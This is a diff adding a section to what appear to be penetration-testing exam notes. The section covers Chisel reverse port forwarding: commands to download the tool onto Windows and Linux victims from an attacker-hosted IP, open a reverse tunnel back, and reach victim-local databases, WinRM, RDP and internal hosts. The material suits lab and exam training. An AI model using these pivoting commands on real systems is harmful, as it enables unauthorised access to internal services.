@@ -2744,6 +2744,155 @@ Proxychains:
 socks5 127.0.0.1 1080
 ```
 
+### 15.4 Chisel Reverse Local Port Forwarding - Access Victim Local Services from Kali
+
+Use this when a service is only listening on the victim’s localhost, such as MySQL on `127.0.0.1:3306`, and you want to access it from Kali.
+
+> Chisel syntax note: `R:<KALI_LISTEN_PORT>:<VICTIM_HOST>:<VICTIM_PORT>` means Kali listens on `<KALI_LISTEN_PORT>` and forwards traffic through the victim to `<VICTIM_HOST>:<VICTIM_PORT>` from the victim’s perspective.
+
+#### Example: Forward Victim MySQL `127.0.0.1:3306` to Kali `127.0.0.1:3306`
+
+On Kali, start the Chisel reverse server:
+
+```bash
+chisel server --port 8000 --reverse
+```
+
+On Kali, host `chisel.exe` for download:
+
+```bash
+python3 -m http.server 80
+```
+
+On the Windows victim, download Chisel:
+
+```powershell
+iwr -uri http://192.168.45.195/chisel.exe -Outfile chisel.exe
+```
+
+On the Windows victim, create the reverse port forward:
+
+```powershell
+.\chisel.exe client 192.168.45.195:8000 R:3306:127.0.0.1:3306
+```
+
+From Kali, connect to the victim’s local MySQL service through your local port `3306`:
+
+```bash
+mysql -h 127.0.0.1 -P 3306 -u <USER> -p
+```
+
+If MySQL requires no SSL or throws SSL/TLS errors:
+
+```bash
+mysql -h 127.0.0.1 -P 3306 -u <USER> -p --skip-ssl
+```
+
+#### Safer Option: Use a Different Kali Listen Port
+
+If Kali already has MySQL running on port `3306`, forward victim `3306` to Kali `13306` instead:
+
+```powershell
+.\chisel.exe client 192.168.45.195:8000 R:13306:127.0.0.1:3306
+```
+
+Then connect from Kali:
+
+```bash
+mysql -h 127.0.0.1 -P 13306 -u <USER> -p --skip-ssl
+```
+
+#### Linux Victim Version
+
+On Kali:
+
+```bash
+chisel server --port 8000 --reverse
+python3 -m http.server 80
+```
+
+On Linux victim:
+
+```bash
+wget http://192.168.45.195/chisel -O /tmp/chisel
+chmod +x /tmp/chisel
+/tmp/chisel client 192.168.45.195:8000 R:13306:127.0.0.1:3306
+```
+
+On Kali:
+
+```bash
+mysql -h 127.0.0.1 -P 13306 -u <USER> -p --skip-ssl
+```
+
+#### Quick Verification
+
+On victim, confirm the service is local-only:
+
+```bash
+ss -antup | grep 3306
+```
+
+Windows victim:
+
+```powershell
+netstat -ano | findstr 3306
+```
+
+On Kali, confirm the forwarded port is listening:
+
+```bash
+ss -lntp | grep 3306
+ss -lntp | grep 13306
+```
+
+#### Common Targets to Forward
+
+```text
+MySQL      3306
+PostgreSQL 5432
+MSSQL      1433
+Redis      6379
+MongoDB    27017
+HTTP       80 / 8080
+WinRM      5985 / 5986
+RDP        3389
+```
+
+#### Common Patterns
+
+Forward victim-local MySQL to Kali:
+
+```bash
+R:13306:127.0.0.1:3306
+```
+
+Forward victim-local web app to Kali:
+
+```bash
+R:8081:127.0.0.1:8080
+```
+
+Forward victim-local Redis to Kali:
+
+```bash
+R:6379:127.0.0.1:6379
+```
+
+Forward another internal host reachable by the victim:
+
+```bash
+R:8443:10.10.10.50:443
+```
+
+Then browse or connect from Kali:
+
+```bash
+curl http://127.0.0.1:8081
+curl -k https://127.0.0.1:8443
+redis-cli -h 127.0.0.1 -p 6379
+```
+
 ---
 
 ## 16. Exam-Proven Attack Patterns
@@ -2957,3 +3106,5 @@ del C:\Windows\Temp\winPEAS.exe
 ```bash
 rm -f /tmp/linpeas.sh /tmp/pspy64 /tmp/reverse.elf
 ```
+
+
